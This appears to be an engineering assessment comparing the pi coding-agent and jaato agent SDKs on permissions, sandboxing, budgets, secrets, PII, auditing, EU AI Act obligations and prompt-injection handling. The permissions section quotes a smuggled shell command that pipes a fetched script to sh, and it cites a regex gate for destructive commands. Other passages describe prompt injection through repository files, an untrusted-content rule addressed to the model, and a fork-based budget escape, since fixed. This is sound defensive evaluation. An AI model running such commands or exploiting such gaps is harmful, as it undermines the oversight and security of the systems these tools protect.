# jaato (free + premium) vs pi coding-agent — an SDK assessment for corporate harness builders

## Who this is for

A corporate engineering group that intends to build **several** agent harnesses on
one SDK — a compliance reviewer, a code-review bot, a chat assistant, a batch job
runner, an IDE helper — and has to satisfy security, privacy, audit and
(increasingly) EU AI Act obligations while doing so. The question is not "which
is the better coding agent" but "which foundation leaves the least governance
work for us, and at what licensing cost".

Two candidates:

| | pi coding-agent | jaato free | jaato premium |
|---|---|---|---|
| Repo / version | `earendil-works/pi`, `packages/coding-agent` **0.85.1** (commit `b2602be`, 2026-09-07) | `jaato-server` **0.7.0**, `jaato-sdk` **0.16.0** (commit `699c16c`, 2026-09-08) | `jaato-premium` **0.1.205** (commit `3d4b8ab`) |
| Language / runtime | TypeScript, Node ≥ 22.19 (Bun for standalone binaries) | Python 3, daemon + IPC/WebSocket; TS client SDK (pre-release) | Python plugin pack over jaato free |
| Licence | **MIT** | **BUSL-1.1** (Apache-2.0 on 2030-09-01) | **Proprietary**, commercial agreement only |
| Self-description | "deliberately minimal", "no built-in permission system", "no MCP, no sub-agents" | "server-first framework for multi-provider tool orchestration" | governance, PII, SSO and clustering add-on |

## Status & verification disclaimer

Everything below was verified against the trees named above on 2026-09-08
(pi cloned fresh; jaato and jaato-premium at the commits listed). File paths are
given so a reader can re-check. Where a claim rests on a project's own
documentation rather than code, it says so. Nothing here is legal advice; the EU
AI Act section maps *primitives* to *obligations* and a compliance function
still has to do the assessment.

One correction to an older document in this tree: `docs/compare-rbac-profiles-frameworks.md`
lists AppArmor as a premium feature and `docs/compare-jaato-devin.md` calls jaato
MIT. Both are stale. `jaato-server/server/apparmor.py` (about 3,000 lines) and
`server/cgroups.py` ship in the free server, and `LICENSE` is BUSL-1.1.

## The short answer

**pi and jaato are not the same kind of thing, and the choice is mostly about
where you want the governance layer to live.**

- **pi is a mechanism layer.** It ships an excellent single-process agent loop,
  a 33-event extension API where every governance concern is a hook you write,
  first-class enterprise gateways (Bedrock, Vertex, Azure OpenAI, Cloudflare AI
  Gateway, Copilot), a complete session tree on disk, and an MIT licence. It
  deliberately ships **no** permission system, sandbox, run limits, redaction,
  multi-user server, MCP client, or prompt-injection defence. Its own security
  document says isolation "needs to come from the operating system or a
  virtualization/container boundary" and prompt injection "cannot be reliably
  prevented by pi".
- **jaato free is a policy-bearing runtime.** Permission engine with
  sanitisation, blacklist, whitelist and Python evaluators; kernel confinement
  (AppArmor per session, cgroup v2 caps); typed budgets over USD, tokens, seconds,
  tool calls and turns with brownout tiers; an egress allowlist proxy; a
  redaction seam in history and telemetry; OpenTelemetry with OpenInference
  conventions and cost attribution; an untrusted-content boundary on tool
  results; subagents, cascades and completion gates; MCP client; 19 model
  providers. **Profiles are a role model for agents**: a profile's
  `plugins` and `tool_scopes` allow-lists drop every unlisted tool from the
  wire, `plugin_configs.permission.policy` is per-role policy, and
  inheritance only ever tightens (`max_turns` and budget limits are
  most-restrictive-wins, `apparmor` is sticky). The **principal** side is delegated
  rather than modelled: a permission decision can be handed to a Python
  evaluator or to an external system through a webhook or file channel, and
  the session suspends until that system answers, so an existing corporate
  approval or RBAC service decides. The daemon itself has **bearer-token
  auth only** and records no approver identity on the decision.
- **jaato premium adds the parts a compliance officer asks for next**: OIDC SSO
  with a server-side token proxy and mTLS, four-seat PII pseudonymisation with an
  auditor-sealed audit stream, six secret backends (Vault, AWS SM, sops, pass,
  keyring, Infisical), a fork-budget containment fix, and the Daruma compiler
  that turns a declarative "business law" spec into deny-by-default evaluators,
  mediated effects and anti-fabrication attestation checks. It does **not** add
  an identity model of its own (no IdP group to profile or tool mapping),
  a tenant identifier or per-tenant quotas, sandboxing, prompt-injection
  detection, retention or any regulatory mapping, and several of its own backlog items are open.

**Decision rule of thumb**

| If your situation is… | Lean towards |
|---|---|
| Product you will *sell or embed* for third parties; you cannot sign a commercial licence | **pi** (MIT). jaato's BUSL grant forbids this use until 2030. |
| TypeScript/Node shop, developer-desktop assistants, containers already the isolation story | **pi** |
| Internal harnesses on Linux servers; you want permissions, kernel confinement, budgets, OTel and an event audit stream *without writing them* | **jaato free** |
| Above, plus SSO, PII pseudonymisation, Vault-backed secrets, compiled deny-by-default policy, cluster | **jaato free + premium** (commercial agreement) |
| You need data-subject erasure tooling, or a signed audit trail with approver identity | **Neither ships it.** jaato's profiles give you agent roles, its permission channels let your existing approval system decide, and its plain-file layout lets your storage policy do retention; the identity record and the rest are yours to build either way. |

## Scorecard

Ratings: **●●●** ships and is usable as-is · **●●○** ships partially or as a seam
you must complete · **●○○** hook only, you build the feature · **○○○** absent.

| Dimension | pi coding-agent | jaato free | jaato premium (on top of free) |
|---|---|---|---|
| Tool-call permission / approval | ●○○ `tool_call` hook + two example gates | ●●● engine, channels, evaluators, headless API | ●●● + Daruma compiled default-deny |
| Agent-role scoping (what a given agent role may use) | ●○○ per-run `--tools` / `excludeTools`; no role files | ●●● profiles: `plugins`, `tool_scopes`, per-role permission policy, tighten-only inheritance, profile sets | ●●● + Daruma `authority.tools` default-deny |
| Sandboxing / isolation | ●○○ documented container patterns; bubblewrap *example* | ●●● AppArmor per session, cgroups, egress proxy, runner subprocesses (Linux) | ●●● unchanged |
| Tenant isolation | ○○○ one process per user; a container per tenant is your topology | ●●● two levels: per-session kernel confinement on one daemon (multi-tenant acceptance gate, integration-tested) or one daemon per tenant, each with its own bearer token | ●●● + gossip cluster, dashboard SSO and mTLS fronting many daemons |
| Runtime limits (turns, tokens, cost, time) | ○○○ none; bash timeout is model-supplied | ●●● typed `budget_control` + `runtime_limits` + `max_turns` | ●●● + fork-budget carry-over |
| Secrets / credentials | ●●○ 0600 `auth.json`, `!command` indirection; no scrubbing, full env passthrough to bash | ●●○ 0600 stores, `pass://`/`vault://` contract, opt-in env scrubbing, secret-safe repr | ●●● six resolver backends |
| PII / redaction | ○○○ | ●○○ history + telemetry transformer seams | ●●● four-seat pseudonymisation, Presidio, sealed audit |
| Data retention / residency | ○○○ (`--no-session` only); one JSONL per session under `~/.pi` | ●●○ plain-file persistence in a documented per-workspace layout; retention, eviction and housekeeping are deliberately left to the shop's own file-lifecycle policy; many local/EU providers | ●●○ unchanged; pseudonym table and sealed audit stream are additional records under the same policy |
| Audit trail / traceability | ●●○ complete session JSONL tree with model + usage per message | ●●○ 114-event stream, token ledger, OTel/OpenInference, versioned session records | ●●● + attestation, provenance checks, sealed redaction audit |
| Interrogating a finished session (ask it why, replay from a point) | ●●○ `--session` / `--fork` resume the tree under current settings | ●●● `session.wake` under the persisted prompt, `resolve_fork_point`, `replay_messages`, `inject_prompt`, profile sets | ●●● + model-callable `interrogate_session` and replay workspaces |
| Observability adapter | ●○○ vendor-neutral contracts, no OTel adapter, not threaded into the coding-agent SDK | ●●● OTel, Langfuse, Phoenix, cost spans | ●●● + per-server resource identity |
| Human oversight (approve, stop, steer, ask) | ●●○ abort, steering queue, follow-ups; approval only via extension | ●●● permissions, out-of-band approval channels, clarification, plan events, completion gates, stop | ●●● + HandoffGate async approval primitive, park and resume |
| Prompt-injection / untrusted content | ○○○ explicitly out of scope | ●●○ tagged untrusted boundary + system-prompt layer (soft) | ●●○ unchanged |
| Context reduction | ●●● compaction, branch summaries, hooks | ●●● four GC plugins, result rewriting, deferred tools, cache plugins | ●●● (benchmark harness only) |
| Model providers / enterprise gateways | ●●● ~30 incl. Bedrock, Vertex, Azure, Cloudflare gateway, Copilot | ●●● 19 incl. Vertex, OpenRouter, GitHub Models, NIM, EU and local; no Bedrock/Azure native | ●●● unchanged |
| MCP | ○○○ by design | ●●● client (`.mcp.json`); not an MCP server | ●●● unchanged |
| Multi-user server / identity | ○○○ experimental Unix-socket server, unauthenticated | ●●○ daemon, WS bearer token, `set_client_user` hook | ●●● OIDC, WS auth proxy, mTLS |
| Delegating a permission decision to an external system (your RBAC / approval service) | ●○○ `tool_call` hook can call out synchronously | ●●● evaluators call a policy API; webhook and file channels suspend the session until the external decision arrives | ●●● + HandoffGate parks the tool, session may be unloaded and resumed on approval (demo: `reliability-exercise`) |
| Identity model (which user may use which role, who approved) | ○○○ | ●○○ `set_client_user` hook; no approver identity on events | ●○○ OIDC login; `allowed_emails` / `allowed_groups` at the dashboard edge; no group-to-profile binding |
| Multi-agent | ●○○ example extension (subprocess per subagent) | ●●● subagents, profiles, cascades, payload schemas, runner pool | ●●● + handoff, remote spawn (currently broken per backlog) |
| Extensibility model | ●●● 33 lifecycle events, TS extensions via jiti | ●●● 5 entry-point groups, daemon hooks, enrichment pipeline, traits | ●●● scaffold verbs |
| Cross-language integration | ●●○ JSONL RPC/JSON modes; TS only | ●●● Python in-process, IPC, WS JSON, TS SDK (pre-npm) | ●●● + web components |
| Supply chain / release integrity | ●●● pinned deps, shrinkwrap, `--ignore-scripts`, SHA256SUMS | ●●○ entry-point trust policy; TestPyPI today, PyPI intended once out of alpha; no signed releases yet | ●●○ delivered directly under the commercial licence, by design |
| Licence for internal use | ●●● MIT | ●●● BUSL grant allows | commercial |
| Licence for resale / embedding | ●●● MIT | ○○○ forbidden until 2030-09 | commercial |

## 1. Licensing (read this first)

**pi** is MIT (`LICENSE`, one root file, `"license": "MIT"` in every package
manifest). No use restriction.

**jaato free** is Business Source License 1.1 (`LICENSE`). The Additional Use
Grant permits production use *except* to "offer a commercial AI agent
orchestration service or AI development tool that is provided to third parties
as a hosted, managed, or embedded product and that includes substantial
functionality of the Licensed Work". Change date 2030-09-01, change licence
Apache-2.0. All `pyproject.toml` files declare `BUSL-1.1`.

**jaato premium** is "proprietary and confidential… licensed, not sold",
distributed by git+ssh from a private repository. No pricing is published.

Practical reading for a corporation:

- Internal harnesses (your employees are the users) are inside the grant.
- A customer-facing product that embeds jaato needs an agreement with
  `licensing@apanoia.dev` before engineering starts.
- Procurement should note that BUSL is not OSI-approved; some open-source
  policies treat it as proprietary.

## 2. Architecture and deployment model

**pi** is one Node process per user. `createAgentSession()` gives you the loop in
process (`packages/coding-agent/docs/sdk.md`, 13 worked examples). Headless use
is `-p`, `--mode json` (event stream out) or `--mode rpc` (JSONL bidirectional,
about 40 commands). A `packages/server` + `packages/protocol` + `packages/client`
split exists but its own README says the transport is Unix sockets only, "peer
authentication… is not implemented", the CBOR protocol "has no compatibility
guarantees" and the client "never reconnects". A shared multi-user pi service is
therefore a project you run, not one you install.

**jaato** is a daemon (`python -m server --ipc-socket … --web-socket …`) that
hosts many sessions, each in its own runner subprocess drawn from a pre-warmed
pool (`server/runner_pool.py`), with clients attached over IPC or WebSocket. An
in-process mode exists too (`jaato.session(mode="in_process")`), and a recovery
client reattaches after daemon restarts. This is the natural shape for a
central "agent service" that several harnesses share, and it is also where most
of jaato's operational surface (cgroups, AppArmor, WS auth, queue bounds) lives.

Consequences:

- pi's isolation story is *around* the process (container, micro-VM, OpenShell);
  jaato's is *inside* the daemon (per-session kernel confinement) and can be
  combined with containers.
- pi extensions run with the full permissions of the process, in the same
  process; jaato plugins run in the session's runner, which can be confined.
- pi has no per-session resource accounting because there is no
  server; jaato has it because there is.

## 3. Permissions, approval and human-in-the-loop

**pi.** `docs/usage.md`: pi "intentionally does not include built-in MCP,
sub-agents, permission popups, plan mode…". Static allow-lists exist at startup
(`--tools`, `--exclude-tools`, `defaultTools`). Project trust
(`src/core/trust-manager.ts`) is a load-time gate on project-local extensions
and settings, explicitly "not a sandbox". The building block for a corporate
approval layer is the `tool_call` event
(`src/core/extensions/types.ts:889-954`): input is mutable, return
`{ block: true, reason, terminate }` to stop the call, and a handler error
blocks fail-safe. Two example gates ship (`examples/extensions/permission-gate.ts`
regexes for `rm -rf|sudo|chmod 777`; `protected-paths.ts`). Nothing persists
"always/never" decisions, RPC mode has no approval command, and a permission UI
in RPC must use the extension-UI protocol. **You build the policy engine.**

**jaato free.** `shared/plugins/permission/` (about 5,900 lines). Evaluation order
is sanitisation → Python evaluators → blacklist → whitelist → default policy;
blacklist always wins. Shell metacharacter guard so `python *` in a whitelist
cannot approve `python x.py; curl evil | sh` (`policy.py:33-53`). Responses `y /
n / once / always / never / turn / idle / all`. Channels: console, webhook, file,
queue, parent-bridged (subagent asks parent). Per-profile policy under
`plugin_configs.permission.policy`. Headless harnesses answer
`PermissionRequestedEvent` with `PermissionResponseRequest` (may edit arguments)
and mutate rules at runtime. `PermissionResolvedEvent.method` records whether a
human, the whitelist, the blacklist or the default decided. Separately, the
`reliability` plugin enforces repetitive-call, error-retry, introspection-loop
and turn-duration thresholds, plus prerequisite policies
(`docs/reliability-policies-config.md`). Human-in-the-loop beyond approval:
`clarification` plugin (agent asks the user), `PlanUpdatedEvent` for plan
visibility, `CancelToken` stop, and `completion_processors` that can *refuse* an
agent's completion claim with a bounded `max_refusals`.

**Roles for agents versus roles for people.** `jaato-scaffold explain
profile` (run against server 0.7.0) shows the profile schema doing what an
agent-side RBAC layer does: `plugins` is a required allow-list (`[]` wires
only the framework set), `tool_scopes` is a per-plugin allow-list whose
unlisted tools are "dropped from this session's wire + grammar",
`plugin_configs.permission.policy` carries the role's blacklist and
whitelist, and inheritance is designed so a child role can only tighten:
`max_turns` and `budget_control.limits` are most-restrictive-wins,
`apparmor` and `suppress_base_instructions` are sticky, `plugins` is
union-only so a child cannot widen by omission but also cannot narrow
except through `tool_scopes` or the permission whitelist. Profile sets
(`.jaato/profiles/<set>/`) let one workspace carry several such role
catalogues. Premium's Daruma compiles the same idea further into a
generated default-deny evaluator over `authority.tools`. pi has no
equivalent: role scoping there is a per-invocation `--tools` list or a
`tool_call` extension.

**The person side is delegated, not modelled.** jaato does not carry an
identity model of its own, but it ships the seam through which a
corporation's existing RBAC or approval system takes the decision, without
a framework change:

- **Synchronous evaluators.** `.jaato/policies/*.py` scripts run on every
  permission check, receive an `EvalContext` (`agent_name`, `session_id`,
  `workspace_path`, `turn_index`, `model_preamble`), can call an external
  policy service, and return any scoped decision the interactive prompt
  offers, including deny-with-comment so the model learns why
  (`docs/permission-evaluators.md`). They run even against pre-approved
  tools, so a guardrail survives an `allow_all` session.
- **Asynchronous channels.** `WebhookChannel` posts the request to an
  approval endpoint and waits for the answer; `FileChannel` writes a request
  file and polls for a response file, and `JAATO_PERMISSION_TIMEOUT=0` waits
  forever, so the agent session is suspended until a separate process
  decides (`shared/plugins/permission/channels.py`). `QueueChannel` serves
  SDK clients and `ParentBridgedChannel` bubbles a subagent's request to its
  parent. The webhook payload carries request id, tool, arguments and
  context, which is what a ServiceNow, Jira or Slack approval flow needs.
- **Park and resume (premium).** The `reliability-exercise` repository in the
  jaato GitHub organisation (private) exercises this end to end: a
  repeatedly failing tool is escalated and denied, a deployment reactor parks
  a `HandoffGate` and asks a human through a Telegram bot, and on approval
  the reactor drives the retry, in one tier after the session had been
  unloaded and is resumed under the same id. No jaato source edits; the glue
  is workspace-scoped reactors and scripts.

So "man in the loop" is a shipped mechanism in free and a demonstrated park
and resume in premium, and whatever RBAC the company already runs sits
behind the webhook. What the framework still does not do is record *who*
answered: `PermissionResolvedEvent.method` says "user", `set_client_user`
stores an id that nothing consumes, and premium's `allowed_emails` /
`allowed_groups` are checked at the dashboard edge only. "Identity model" in
the rest of this document means that gap, not the delegation seam.

**jaato premium.** Daruma (`jaato_premium/scaffold/daruma/`, exposed as
`jaato-scaffold compile spec.yaml`) compiles a YAML domain spec into a profile, a
default-deny evaluator ("deny anything outside `authority.tools`"), a mediated
host tool where the guard is fused with the effect, an attestation completion
processor, a reactor and a pytest suite, then re-validates the output through
the free loaders. The design refuses to emit an unsound placement. HandoffGate
(`reactors/gates/`) is a lease-based async approval primitive that parks an
escalated tool until a human releases it. Still no identity model of its own or per-user policy;
`tenant_id` is "reserved for future multi-tenant scoping".

## 4. Sandboxing and isolation

**pi.** None in-process, by explicit design (`docs/security.md`, "No Built-in
Sandbox"). Built-in tools pass absolute paths straight through
(`src/core/tools/write.ts:65`, `edit.ts:161`) with no workspace check. The bash
tool inherits the **entire parent environment**, including every provider key
(`src/utils/shell.ts:138-149`). `docs/containerization.md` documents four
patterns: Gondolin micro-VM extension (routes the seven built-in tools into a
QEMU VM), plain Docker, NVIDIA OpenShell (policy-controlled sandbox with
credential and inference routing) and Docker Sandboxes (credential kept on the
host and substituted at egress). An `examples/extensions/sandbox/` wraps
`@anthropic-ai/sandbox-runtime` (bubblewrap on Linux, `sandbox-exec` on macOS)
with network domain and filesystem allow/deny lists, but it is an example, not
a dependency of the CLI. A `spawnHook` on the bash tool is the intended place to
scrub env or wrap commands.

**jaato free.**

| Layer | Where | What |
|---|---|---|
| Kernel MAC | `server/apparmor.py`, `docs/apparmor-setup.md` | per-session AppArmor profile; WS sessions auto-confine, IPC opts in; `JAATO_REQUIRE_APPARMOR=1` refuses to start unconfined; degradation announced as a `SystemMessageEvent` |
| Resource caps | `server/cgroups.py`, `docs/runtime-limits-setup.md` | cgroup v2 slice per session: `memory.max`, `pids.max`, `cpu.weight`, attached between fork and exec |
| Process | `server/runner_pool.py` | one runner subprocess per session, forked from a warm template, daemon is subreaper |
| Path policy | `shared/plugins/sandbox_manager/`, `shared/plugins/path_safety.py` | three-tier path allow config; TOCTOU-safe `open_verified()`; FIFO/device rejection |
| Boundary | `jaato-sdk/jaato_sdk/path_boundary.py` | relative paths are rejected, never resolved, across the daemon boundary |
| Egress | `server/egress_proxy/`, `server/nft.py` | CONNECT-only deny-by-default allowlist proxy with proxy-side DNS; nftables enforcement script |
| Transport | `--socket-mode 660`, `--ws-token` | IPC is unauthenticated by design (file mode only); WS bearer token, SHA-256 stored, constant-time compare |
| Code exec | `shared/plugins/notebook/` | in-process cell execution fails closed unless AppArmor is enforcing |

**Tenancy is delivered at two levels.** Inside one daemon, the confined
runner design (`docs/design/per_session_confined_runner.md`) names
multi-tenant correctness as its acceptance gate: two cascades from two
workspaces run concurrently against a single daemon, a tool call in one
workspace cannot read or write the other's tree, and
`tests/integration/test_phase2_multitenant_apparmor.py` checks it. Runner
tracebacks are path-sanitised before crossing the RPC boundary so one
tenant's workspace path never lands in another's event (`runner/sanitize.py`),
and cgroup caps are per session. Across daemons, each `jaato-server` mints
its own bearer token (`~/.jaato/ws.token`, or `--ws-token` / `--ws-token-file`)
and owns its own `~/.jaato`, sessions and logs, so one daemon per tenant with
separate tokens is a supported topology rather than a workaround; premium's
gossip cluster, dashboard SSO and mTLS front many such daemons behind one
login. What is not in the data model is a tenant *identifier*: the bearer
token says "may drive this daemon", not which tenant, per-tenant quotas are
not aggregated in-daemon, and the design records that the daemon process
itself can still read every workspace's `.jaato/` (a daemon-level profile is
deferred).

Limits: Linux only; no container-per-session executor; no seccomp; the
`apparmor_parser` sudoers rule is operator work.

**jaato premium** adds nothing here beyond cluster-level process separation.

## 5. Runtime limits and cost control

**pi.** No max turns, no token cap, no cost cap, no wall-clock budget (grep for
`maxTurns|maxIterations|maxSteps` across `packages/*/src` returns nothing).
The bash tool's timeout is an optional *model-supplied* parameter with "no
default timeout" (`src/core/tools/bash.ts:39`). What exists: output truncation
(2,000 lines / 50 KB, `truncate.ts`), provider retry policy (`retry.*`
settings), HTTP idle timeout, per-message `usage.cost`. A corporate limiter is
an extension summing cost on `turn_end` and calling `abort()`.

**jaato free.** `shared/budget_control.py`: limits over `usd`, `tokens`,
`seconds`, `tool_calls`, `turns` with a `degrade` ladder that rebinds model tiers
at percentage rungs (brownout before blackout). `shared/runtime_limits.py`:
validated `memory_max_mb`, `pids_max`, `cpu_weight`, `tool_timeout_seconds`,
`max_output_bytes`. Profile `max_turns` (default 10; a child profile may only
tighten it). Interactive shell lifetimes and reaper. Parallel tools capped at 8.
Rate-limit retry env (`AI_RETRY_*`). Bounded IPC event queue with lossy media
and essential-event classes. `PayloadExceedsContextError` refuses a doomed
request. Gaps: budgets are per session, not per user or tenant; the 8-way tool
cap is not configurable.

**jaato premium.** `fork_budget.py` closes a real escalation: a fork of an
exhausted session previously "came back with a FRESH, full ceiling", and the
vector was model-invokable via `interrogate_session`. Ceiling and usage now
carry over at spawn; an unbudgeted fork is torn down rather than allowed.
Budgets observed are turns and tokens; currency ceilings and per-tenant quotas
remain absent.

## 6. Secrets and credentials

**pi.** `~/.pi/agent/auth.json` written 0600 in a 0700 directory
(`src/core/auth-storage.ts:25`), with `!command` indirection (`op read`,
`security find-generic-password`) and `$ENV` interpolation, so an enterprise
secret manager can be used without code. OAuth tokens for Claude, Codex,
Copilot, xAI, OpenRouter stored the same way. **No redaction anywhere**: if a
tool echoes a key it lands verbatim in the session file and any HTML export.
Full environment passthrough to bash (see §4).

**jaato free.** Per-provider credential stores at 0600. `pass://` and `vault://`
URIs in profile `env:` stay unresolved on disk and are resolved daemon-side at
spawn; unresolved URIs fail loud. `shared/secret_scrub.py` strips
`*_API_KEY`, `*_TOKEN`, `*_SECRET` and friends from subprocess and MCP server
environments, but **only when a profile opts in** ("deliberately no implicit
default set"). `shared/secret_repr.py` prevents keys leaking through `repr()`
after a real incident (#721). The documented contract "never pass a credential
as an `agent_param`" exists because rendered personas are now persisted. The
free tree ships the URI *contract*; the resolver implementations are a premium
entry point.

**jaato premium.** `secret_resolvers.py`: Vault KV v2, AWS Secrets Manager,
sops, pass, keyring, Infisical. Process-lifetime cache with no documented
rotation hook. One finding for your security review: the OIDC discovery and
JWKS fetches in `session_reconnect/extension.py:179,186` use
`httpx.AsyncClient(verify=False)`.

## 7. PII and data governance

**pi.** Sessions persist everything: prompts, assistant text and thinking, tool
arguments and results, bash output, base64 images, and per-message
provider/model/usage/cost (`docs/session-format.md`). No redaction, retention,
expiry or encryption at rest. Controls that do exist: `--no-session` /
`SessionManager.inMemory()`, `images.blockImages`, `!!` commands excluded from
context, `PI_OFFLINE=1`. Egress to watch: `/share` uploads the whole branch
*plus system prompt and tool definitions* to a viewer (Radius, falling back to a
private GitHub gist); install/version pings to `pi.dev` are on by default
(`enableInstallTelemetry`, `PI_TELEMETRY=0` to disable); the same flag governs
attribution headers to OpenRouter, NIM and Cloudflare. `enableAnalytics`
defaults off.

**jaato free.** No PII detector or anonymiser. What exists is the seam:
`session_history.set_inbound_transformer()` (write-side pseudonymisation so
canonical history never holds raw values) and `set_raw_view_transformer()`; a
telemetry redactor chain and `JAATO_TELEMETRY_REDACT_CONTENT` (note: the
profile key `plugin_configs.telemetry.redact_content` is recorded as inert in
`shared/env_scope.py`; only the env var works). Session records live under
`<workspace>/.jaato/sessions/`, logs under `.jaato/logs/`, traces where the
profile's `trace:` block says. **Retention is delegated on purpose.**
Everything is persisted as plain files in a documented layout, and the
framework owns no retention, eviction or housekeeping engine: the shop's
existing storage policy (a scheduled sweeper, a filesystem lifecycle rule,
backup and legal-hold tooling) applies to these paths the same way it
applies to any other application's files. `session.delete` exists for a
targeted removal. The consequence to plan for is that data-subject erasure
across sessions, logs, traces and telemetry exports is a search-and-delete
your policy tooling performs over known paths, not a framework verb. No phone-home of any kind (no analytics libraries in the
tree; telemetry defaults off). Data residency options are broad: fully local
(`ollama`, `lmstudio`, `vllm`, `tensorrt_llm`, `triton`, `chrome_ai`) and EU
(`ovhcloud`, `nebius`).

**jaato premium.** `jaato_premium/pseudonymization/` is the strongest
compliance feature in either product: the model, telemetry exporter, memory
plugin, session journal, GC summariser and reactors see typed placeholders
(`<EMAIL_ADDRESS_1>`, `<PERSON_3>`); re-identification happens only at
operator-designated tool dispatch and at user display. Presidio + spaCy with
jaato-specific and Spanish recognisers; NaCl SecretBox at rest under a daemon
master key; fork-carry; 168 tests. Its own backlog lists the gaps honestly: no
output-side leak scanning, no cross-session pseudonymisation, tools are
trusted by default (`JAATO_REDACTION_UNTRUSTED_TOOLS` is a deny list, default
empty), and the operator doc is stale. Retention is the shop's storage policy
in both tiers by design; nothing in either tier does classification, DSAR
or residency enforcement.

## 8. Auditing, traceability, observability

**pi.** The session JSONL is a proper audit substrate: every entry has an id,
parent id and ISO timestamp; assistant messages record `api`, `provider`,
`model`, `responseModel`, `responseId`, `usage` with per-component cost, and
`stopReason`; tool results record name, call id, content and error flag; model
changes, compactions and branch summaries are entries too. `--mode json`
streams the same events for a collector. `packages/telemetry` is a
vendor-neutral span contract with an in-memory reference and a conformance
suite, but **no OpenTelemetry adapter ships** and the coding-agent SDK layer does
not thread a telemetry context (`grep TelemetryContext packages/coding-agent/src/core`
is empty). No tamper evidence, no log shipping, no retention.

**jaato free.** A 114-event typed stream (`jaato-sdk/jaato_sdk/events.py`,
Pydantic, mirrored into TypeScript with a CI staleness gate) including
permission requested/resolved, plan updates, tool output, clarification, GC and
tier events. Token ledger JSONL (`LEDGER_PATH`). OpenTelemetry spans
`jaato.turn → jaato.tool → jaato.permission` with OpenInference attributes, cost
resolved provider-reported → `.jaato/pricing.json` (LiteLLM schema) → none; a
Langfuse backend and a Phoenix compose file. Session records version 2.8
persist the resolved profile and the *rendered* system instruction, so an
auditor can recover the exact prompt a turn ran under.

**Interrogation is a free primitive, not a premium tool.** A finished session
can be woken (`session.wake`) under the profile and prompt it ran with and
asked, in prose, to account for what it did; the question arrives wrapped as
untrusted content, so the agent reads it as data. Three typed verbs sit under
that on the IPC and WebSocket clients (`jaato-sdk/jaato_sdk/events.py`,
"SDK feature parity"): `inject_prompt` (steer or follow-up),
`resolve_fork_point` (a message index, tool call id or timestamp) and
`replay_messages` (re-run the model loop from an explicit message list or the
current history). A profile set (`JAATO_PROFILE_SET`) shadows the session's
own contract for the interrogation without touching the original, and
`JAATO_REVIVE_PROFILE=disk` re-derives it. The
`jaato-eval-issue-fix-sweep-harness` repository in the jaato organisation
exercises this in `tools/interrogate/`: after a sweep arm passed with a
report whose "root cause" quoted code that was never in the file, the arm was
revived and asked to account for the discrepancy, which is exactly the
Article 12 question a reviewer needs answered. Premium's `session_ops` wraps
the same primitives as model-callable tools (`interrogate_session`,
`setup_replay_workspace`, `replay_in_workspace`); it is a convenience, not
the capability.

Gaps: no actor identity
on events, no hash chain or signing, no SIEM exporter, no pricing data shipped.

**jaato premium.** Daruma attestation guards check a model's completion receipt
against the tool-call ledger; `provenance` and `provenance_array` generate
anti-fabrication checks so an audit trail's "traceability complete" claim is
compiled, not hoped for. Every pseudonym-table mutation emits a
`redaction.audit` span sealed to an offline auditor's public key ("the daemon
itself cannot decrypt its own emissions"). Per-server OTel resource identity
for clusters. Drift monitor ships as an opt-in example and is under a declared
refactor. Still no immutable event store or signed trail.

## 9. EU AI Act mapping

Neither product mentions the EU AI Act, ISO 42001, NIST AI RMF or SOC 2
anywhere (grep across all three trees is empty). What follows maps the
*deployer-side* obligations most harness builders will meet (the Act's high-risk
provisions, Articles 9–15, and the deployer duties in Article 26) to primitives.
Whether a given harness is high-risk is a legal determination this document
does not make.

| Obligation (paraphrased) | pi | jaato free | jaato premium |
|---|---|---|---|
| **Record keeping / automatic logging** (Art. 12, 26): logs sufficient to trace operation over the lifetime | Session tree with model, usage, tool calls; you add shipping and retention | Event stream + ledger + OTel + versioned session records; you add shipping, identity, retention | + attestation, sealed redaction audit |
| **Transparency to deployers/users** (Art. 13): which model, capabilities, limitations | Model/provider in footer, env and every message | Model/provider in events and `profile_snapshot`; presentation context | + "Transparency Mandate" instruction layer (soft) |
| **Human oversight** (Art. 14): ability to interrupt, override, not act on output | `abort()`, steering; approval only via extension | Permission prompts, out-of-band approval channels that suspend the session, clarification, stop, completion gates | + HandoffGate park and resume (demonstrated) |
| **Accuracy, robustness, cybersecurity** (Art. 15): resilience to manipulation, e.g. prompt injection | Explicitly out of scope | Untrusted-content boundary, egress allowlist, AppArmor, permission gating | + default-deny compiled evaluators |
| **Data governance** (Art. 10) and GDPR interplay: minimisation, protection of personal data | `blockImages`, `--no-session` | Redaction seams, local/EU providers | Four-seat pseudonymisation |
| **Risk management, conformity documentation** (Art. 9, 11, 17) | Nothing | Nothing | Nothing |
| **Reproducibility of a decision** | Fork/resume of the session tree; no seed | `session.wake` revives a finished session under its persisted profile and rendered prompt and can be asked to account for a decision; `resolve_fork_point` + `replay_messages` re-run the loop from any message, tool call or timestamp; profile sets swap the interrogation contract; `echo` provider for deterministic CI | Same primitives wrapped as model-callable tools (`session_ops`) |

Honest reading: jaato gives a deployer more Article 12/14/15 *evidence* out of
the box; pi gives a clean substrate and expects you to build the controls.
Neither produces the documentation set (risk register, technical file,
instructions for use). Budget for that regardless.

## 10. Prompt injection and untrusted content

**pi.** `SECURITY.md` lists prompt injection under "Out of Scope" and notes
`AGENTS.md` or code comments "can be used to prompt inject the coding agent
trivially". Context files load regardless of project trust. No tainting, no
provenance on tool output. Mitigation is a `tool_result` / `context` extension
you write.

**jaato free.** Tools carrying `TRAIT_UNTRUSTED_CONTENT` (`mcp`, `web_fetch`,
`web_search`, `subagent` results) have results wrapped in `⟦UNTRUSTED-EXTERNAL-CONTENT source=…⟧` markers
with the source label sanitised against marker forgery, and a system-prompt
layer instructs the model to treat wrapped content as data. That layer survives
`suppress_base_instructions: true` unless dropped by name. The code itself
calls this "a soft boundary" complementing the hard ones (egress allowlist,
permission gating). No classifier, no output-side exfiltration scan.

**jaato premium.** No injection-specific control; default-deny evaluators and
pseudonymisation limit blast radius.

## 11. Context reduction

Both are mature. pi: auto-compaction when
`contextTokens > contextWindow - reserveTokens` (defaults 16,384 reserve, 20,000
kept), manual `/compact`, branch summaries on tree navigation, five session
hooks, split-turn handling (`docs/compaction.md`, 418 lines). jaato: four GC
plugins (truncate, summarise, hybrid, budget) with threshold/target/pressure
percentages, `result_grep` result rewriting on `TRAIT_GREPPABLE_CONTENT`,
deferred tool loading, provider cache plugins (Anthropic, Google, ZhipuAI) with
TTL and history breakpoints, instruction budgets. Premium adds only a GC
benchmark harness that measures the free plugins.

## 12. Integration and extensibility

### Providers and gateways

| | pi (`packages/ai`) | jaato (`model_provider/`) |
|---|---|---|
| Count | about 30 | 19 |
